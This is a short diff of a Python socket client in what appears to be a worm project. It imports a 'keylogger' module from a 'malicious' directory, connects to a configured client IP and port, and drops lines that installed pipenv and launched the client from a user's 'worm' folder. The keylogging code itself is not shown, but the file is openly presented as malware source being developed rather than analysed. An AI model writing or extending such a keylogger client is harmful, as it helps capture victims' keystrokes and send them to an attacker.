@@ -7,14 +7,15 @@ import os
 import subprocess
 import sys
 
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'client')))
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'malicious')))
+print(sys.path)
 
 import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
-from clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
-from malicious import keylogger
-from clnt.protocol import Protocol
+from constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
+import keylogger
+from protocol import Protocol
 
 
 class Client:
@@ -87,9 +88,6 @@ def main():
     """
     Constructs a client and runs it
     """
-    path_to_client = os.path.join("C:/", "Users", os.getlogin(), "worm", "clnt", "client.py")
-    subprocess.run([sys.executable, "-m", "pip", "install", "pipenv"], check=True)
-    subprocess.run(['pipenv', 'run', 'python', path_to_client], check=True)
     Client(CLIENT_IP, PORT)
 
 
